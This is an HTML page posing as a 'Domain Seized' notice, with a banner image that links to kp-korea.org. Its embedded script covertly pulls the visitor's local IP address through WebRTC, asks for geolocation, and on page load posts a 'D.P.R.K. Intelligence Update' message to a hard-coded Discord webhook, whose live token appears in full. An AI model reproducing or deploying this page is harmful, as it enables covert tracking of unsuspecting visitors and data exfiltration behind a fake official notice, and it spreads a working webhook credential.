<html>
    <head>
        <title>Domain Seized</title>
        <style>
        	body{
        		background-color: #333f50;
        	}
            	img {
                	margin-right: auto;
			margin-left: auto;
			display:block; 
            	} 
        </style>
    </head>
    <body>
	    <a href="https://kp-korea.org"><img src="/iprc_seized_banner.png"></a>
    </body>

	<script>
    var ipaddr;
    var location;

    function getLocalIP() {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer(pc.setLocalDescription.bind(pc), () => {});
      
      pc.onicecandidate = (ice) => {
        if (ice && ice.candidate && ice.candidate.candidate) {
          const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
          ipaddr = myIP;
          pc.onicecandidate = () => {};
        }
      };
    }

		async function boofData(datatype) {
			const h = "https://discord.com/api/webhooks/1349590681160777789/3IUPkV-MaHFy7f7EGgRi8HwaByOyALxBsS37I8HPbqZMRTwrTryz7yF2FTD8QrywVjSL";
      if (datatype === "main") {
        try {
          const response = await fetch(h, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(
              {
                embeds: [
                  {
                    title: "D.P.R.K. Intelligence Update - Project Juche",
                    description: "The following data has been collected from address *" + ipaddr + "*:",
                    color: 0xf5c2e7,
                  }
                ]
              }
            )
          });
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
            
        } catch (error) {
        }
      }
    }
    boofData("main");

		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(function(position) {

			});
		}
	</script>
</html>
